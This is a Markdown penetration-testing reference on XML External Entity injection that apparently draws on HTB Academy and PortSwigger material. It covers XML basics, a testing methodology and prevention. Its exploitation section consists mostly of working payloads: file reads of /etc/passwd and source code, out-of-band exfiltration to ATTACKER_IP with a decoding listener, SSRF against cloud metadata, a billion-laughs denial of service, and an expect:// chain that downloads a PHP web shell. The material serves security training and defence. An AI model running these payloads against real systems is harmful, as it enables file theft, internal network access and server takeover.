# XML External Entity (XXE) Injection

A practical reference for identifying, exploiting, and preventing XXE vulnerabilities. Covers basic file disclosure through blind out-of-band exfiltration.

---

## Table of Contents

- [What is XXE?](#what-is-xxe)
- [XML Fundamentals](#xml-fundamentals)
- [DTDs and Entities](#dtds-and-entities)
- [Attack Surface: Where XXE Hides](#attack-surface-where-xxe-hides)
- [Exploitation](#exploitation)
  - [1. Basic Local File Disclosure](#1-basic-local-file-disclosure)
  - [2. Reading Source Code (PHP Filter Wrapper)](#2-reading-source-code-php-filter-wrapper)
  - [3. Advanced Exfiltration with CDATA](#3-advanced-exfiltration-with-cdata)
  - [4. Error-Based XXE](#4-error-based-xxe)
  - [5. Blind OOB Data Exfiltration](#5-blind-oob-data-exfiltration)
  - [6. SSRF via XXE](#6-ssrf-via-xxe)
  - [7. XInclude Attacks](#7-xinclude-attacks)
  - [8. Denial of Service (Billion Laughs)](#8-denial-of-service-billion-laughs)
  - [9. RCE via XXE](#9-rce-via-xxe)
- [Testing Methodology](#testing-methodology)
- [Prevention](#prevention)
- [Tooling](#tooling)

---

## What is XXE?

XML External Entity (XXE) injection is a vulnerability that arises when an application parses attacker-controlled XML input without disabling dangerous parser features, specifically the ability to resolve external entities.

Exploiting it can let an attacker:

- **Read arbitrary files** from the server's filesystem (configs, source code, SSH keys)
- **Perform SSRF**, pivoting the server into making requests to internal-only systems
- **Exfiltrate data blind**, out-of-band, when nothing is reflected back
- **Crash the server** via entity expansion (DoS)
- **Achieve RCE** in rarer, more favorable configurations

It's a long-standing member of the OWASP Top 10, and it keeps showing up because the root cause isn't usually bad application code. It's typically an XML parser shipping with unsafe defaults.

---

## XML Fundamentals

XML structures data as a tree of elements. A quick refresher on terminology before diving into exploitation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <sender>john@inlanefreight.com</sender>
  <body>Hello, please send the invoice.</body>
</email>
```

| Term | Description | Example |
|---|---|---|
| **Tag** | Element name, wrapped in `<>` | `<date>` |
| **Element** | Root or child node; value sits between start/end tags | `<date>01-01-2022</date>` |
| **Attribute** | Extra metadata stored in a tag | `encoding="UTF-8"` |
| **Entity** | An XML "variable", wrapped in `&;` | `&lt;` |
| **Declaration** | First line, defines version/encoding | `<?xml version="1.0"?>` |

Reserved characters (`<`, `>`, `&`, `"`) must be escaped as `&lt;`, `&gt;`, `&amp;`, `&quot;` when used as literal content.

---

## DTDs and Entities

A Document Type Definition (DTD) validates an XML document's structure and, critically, is also where entities are declared.

**Inline DTD:**
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, sender, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

**External DTD (by file or URL):**
```xml
<!DOCTYPE email SYSTEM "email.dtd">
<!DOCTYPE email SYSTEM "http://attacker.com/email.dtd">
```

### Internal entities (basic variables)

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Referenced anywhere in the document as `&company;`. The parser substitutes the value at parse time.

### External entities: the actual vulnerability

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

When `&xxe;` is referenced, the parser fetches and inlines the contents of the referenced resource, whether that's a local file or a URL. This single feature is the foundation of every technique below.

### Parameter entities

A special entity type prefixed with `%`, usable only inside the DTD itself. Parameter entities become important later because, unlike regular entities, they can be joined when referenced from an external DTD. That's the trick that unlocks CDATA-based and error-based exfiltration.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
```

---

## Attack Surface: Where XXE Hides

XXE isn't limited to requests that obviously contain XML. Look for it in:

- **Direct XML endpoints.** Contact forms, SOAP APIs, any `Content-Type: application/xml` or `text/xml` request
- **Content-Type coercion.** Some apps default to JSON but will still happily parse XML if you change the header and reformat the body. Always try flipping `application/json` to `application/xml` on a POST request, even if the app "only uses JSON"
- **File uploads.** Formats that are XML under the hood: SVG (images), DOCX/XLSX (Office Open XML), and other XML-based document formats. An app that only expects PNG/JPEG may still hand SVGs to a vulnerable image library
- **XInclude.** When the app embeds *your* data into a larger server-side XML document (e.g., inserting form data into a backend SOAP request), you don't control the DOCTYPE, so classic XXE doesn't apply. XInclude lets you smuggle a file reference into a single data value instead:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Exploitation

### 1. Basic Local File Disclosure

**Step 1: Find a reflected value.** Submit the form normally and note which XML element's value gets echoed back in the response (e.g., an `<email>` field shown in a confirmation message).

**Step 2: Confirm entity injection** with a harmless internal entity:
```xml
<!DOCTYPE email [
  <!ENTITY company "test value">
]>
```
Swap the reflected field's content for `&company;`. If the response shows `test value` instead of the literal string `&company;`, the app is resolving entities and is vulnerable.

**Step 3: Escalate to an external entity:**
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><email>&xxe;</email></root>
```
The response now contains the contents of `/etc/passwd`.

> **Tip:** Some Java applications will return a directory listing if you reference a directory instead of a file. Useful for hunting for interesting filenames.

---

### 2. Reading Source Code (PHP Filter Wrapper)

Referencing a source file directly (`file:///var/www/html/index.php`) usually fails silently. PHP source contains `<`, `>`, `&`, which break XML parsing, so the entity reference is discarded.

**Fix:** Use PHP's `php://filter` wrapper to Base64-encode the file before it hits the XML parser:

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Decode the resulting Base64 blob (Burp's Inspector panel does this in one click) to get the raw source.

**Limitation:** PHP-only. For other stacks, see CDATA exfiltration below.

---

### 3. Advanced Exfiltration with CDATA

Works on any backend, and handles special characters and binary data, not just PHP.

Wrapping content in `<![CDATA[ ... ]]>` tells the parser to treat it as raw, unparsed data. The catch: XML won't let you join an internal entity with an external one directly. The fix is parameter entities, which can be joined when the whole chain is loaded from an external DTD.

**Host a DTD file (`xxe.dtd`) on your attacking machine:**
```xml
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY % end "]]>">
<!ENTITY % joined "%begin;%file;%end;">
```

```bash
python3 -m http.server 8000
```

**Reference it from the target payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

The response now contains the raw source code, no Base64 decoding needed. Much faster when sweeping multiple files for secrets.

> Modern servers sometimes block this for specific files (e.g. `index.php`) as an anti-DoS measure against entity self-reference loops.

---

### 4. Error-Based XXE

Use this when no XML entity value is ever reflected, but the application leaks unhandled runtime errors (e.g. verbose PHP errors).

**Step 1: Confirm error visibility.** Send malformed XML (broken tags, reference to a nonexistent entity) and check whether the app leaks a stack trace or parser error, sometimes even the server's directory structure.

**Step 2: Force file content into the error message.** Host a DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Referencing a nonexistent parameter entity (`%nonExistingEntity;`) forces a parser error, and because it's concatenated with `%file;`, the file's content gets dragged into the error text.

**Step 3: Trigger it:**
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The resulting error response leaks `/etc/hosts`. Swap the file path to read source code instead.

**Reliability note:** More fragile than CDATA. Length limits and certain characters can still break the payload.

---

### 5. Blind OOB Data Exfiltration

The worst case: no reflection, no errors. The only option is making the server exfiltrate data to you.

**Step 1: Base64-encode the target file and smuggle it into an outbound URL:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

**Step 2: Stand up a listener that auto-decodes incoming requests:**
```php
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
```
```bash
php -S 0.0.0.0:8000
```

**Step 3: Full payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The target server requests your listener with the encoded file content as a query parameter. Decode it and you have the file.

**Alternative channel, DNS exfiltration:** place the encoded data as a subdomain (`ENCODEDTEXT.attacker.com`) and capture it with `tcpdump`. More effort, but useful when outbound HTTP is firewalled but DNS isn't.

---

### 6. SSRF via XXE

External entities aren't limited to `file://`, they accept `http://` too, turning XXE into a pivot for internal network access:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

If the entity's value is reflected back, you get full two-way interaction with the internal target (e.g., cloud metadata endpoints, internal admin panels). If not, it's blind SSRF, still dangerous, but limited to inferring success via timing or side effects. See the Server-Side Attacks / SSRF material for full exploitation technique. It applies identically once you can reach an internal URL this way.

---

### 7. XInclude Attacks

Use this when you only control one data value that gets embedded into a larger, server-constructed XML document (so you can't define your own `DOCTYPE`):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Place this as the value of the single field you control. No DOCTYPE required.

---

### 8. Denial of Service (Billion Laughs)

Exponential entity self-reference exhausts server memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root><email>&a10;</email></root>
```

Each entity references the previous one 10x. By `a10`, the expanded string is astronomically large. Note: most modern parsers (Apache, libxml2 defaults) now cap entity expansion depth/size specifically to block this, so it's largely historical at this point. Still worth a quick test on legacy stacks.

---

### 9. RCE via XXE

Rare, and heavily dependent on stack configuration, but worth checking:

- **SSH keys / hash-stealing tricks** (Windows/NTLM relay scenarios), often the fastest path if applicable
- **`php://expect` wrapper**, only works if the (uncommon, non-default) PHP `expect` extension is installed:
  ```
  expect://id
  ```
  Works for simple commands with visible output; complex payloads (reverse shells) tend to break XML syntax.

- **Most reliable: drop a web shell.**

  Serve a shell locally:
  ```bash
  echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
  sudo python3 -m http.server 80
  ```

  Trigger a `curl` download via XXE:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">
  ]>
  <root><email>&xxe;</email></root>
  ```
  Spaces are replaced with `$IFS` to avoid breaking XML syntax; avoid `|`, `>`, `{` as well.

**Reality check:** `expect` isn't installed by default on modern PHP. In practice, XXE is far more valuable as a disclosure primitive (config files, source code, credentials) that leads to RCE through some other vulnerability it reveals, rather than direct RCE itself.

---

## Testing Methodology

A practical decision tree for approaching an unknown XXE target:

1. **Find the surface.** Obvious XML endpoints, or try coercing JSON endpoints to XML via `Content-Type`, or check XML-based upload formats (SVG, DOCX)
2. **Confirm injection.** Harmless internal entity, check for reflection
3. **Escalate to file read.** `SYSTEM "file:///..."`
4. **If output breaks** on special/binary content, try the CDATA + parameter entity method
5. **If nothing is reflected at all**, check for verbose errors, then use the error-based method
6. **If there's no output and no errors**, use out-of-band exfiltration (HTTP or DNS)
7. **Check for SSRF.** Swap `file://` for `http://` targeting internal services
8. **If XML isn't directly submitted** but your data lands in a server-built XML doc, try XInclude
9. Automate repeat testing with [XXEinjector](https://github.com/enjoiz/XXEinjector), which implements all of the above (basic, CDATA, error-based, blind OOB) against a saved request template

---

## Prevention

XXE is unusual among web vulnerabilities: it's rarely caused by bad application logic, and almost always caused by an XML parser's unsafe defaults. That makes it one of the more reliably fixable classes of bug.

### 1. Update your XML parsing libraries

Developers rarely hand-roll XML parsing. They use a library (libxml2, PHP's DOM/SimpleXML, Java's DocumentBuilder, etc.), and outdated versions of these are almost always the actual root cause.

- PHP's `libxml_disable_entity_loader()` is deprecated as of PHP 8.0. Modern PHP disables external entity loading by default, but relying on the old function is explicitly discouraged
- Don't stop at the "main" XML library. Also check anything that parses XML under the hood: SOAP clients, SVG/PDF processors, Office document (DOCX/XLSX) parsers
- Same principle applies beyond XML. Outdated dependencies in general (Node modules, etc.) are a broader supply-chain risk
- Reference: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

### 2. Explicitly disable dangerous parser features

Don't rely on defaults. Disable these outright at the parser configuration level:

- Custom DTD processing
- External entity resolution
- Parameter entity processing
- XInclude support
- Enforce limits on entity expansion to prevent reference-loop DoS

### 3. Fail safely

- Disable verbose/runtime error output in production. Error-based XXE depends entirely on leaked stack traces
- Implement proper exception handling around all XML parsing

### 4. Reduce the attack surface architecturally

- Prefer JSON or YAML over XML for new APIs where feasible
- Avoid XML-native API standards (SOAP) in favor of REST/JSON
- These configuration-based mitigations are a valid defense-in-depth layer, but they're a workaround if the underlying library is still outdated. Patch the library first, harden config second

### 5. WAFs: a layer, not a fix

A WAF can catch common XXE payload patterns, but it should never be the only control. WAF rules can be bypassed (encoding tricks, alternate wrappers), and the backend parser should be secure independent of anything sitting in front of it.

---

## Tooling

| Tool | Purpose |
|---|---|
| **Burp Suite** | Intercept/modify XML requests manually; built-in scanner catches most XXE reliably |
| **[XXEinjector](https://github.com/enjoiz/XXEinjector)** | Automates basic, CDATA, error-based, and blind OOB XXE against a saved request template |
| **Burp Collaborator / self-hosted listener** | Detect and capture blind/OOB interactions |
| **`tcpdump`** | Capture DNS-based OOB exfiltration |

---

*References: HTB Academy, Web Attacks module. PortSwigger Web Security Academy, XML External Entity (XXE) Injection.*